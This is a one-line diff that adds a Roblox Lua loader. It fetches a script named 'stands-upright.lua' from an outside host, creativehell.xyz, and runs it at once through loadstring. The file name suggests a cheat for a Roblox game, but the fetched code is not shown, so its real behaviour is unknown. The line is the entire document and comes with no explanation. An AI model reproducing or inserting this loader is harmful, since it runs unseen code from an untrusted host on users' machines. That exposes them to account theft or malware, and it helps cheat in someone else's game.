@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('http://scripts.creativehell.xyz/stands-upright.lua',true))()
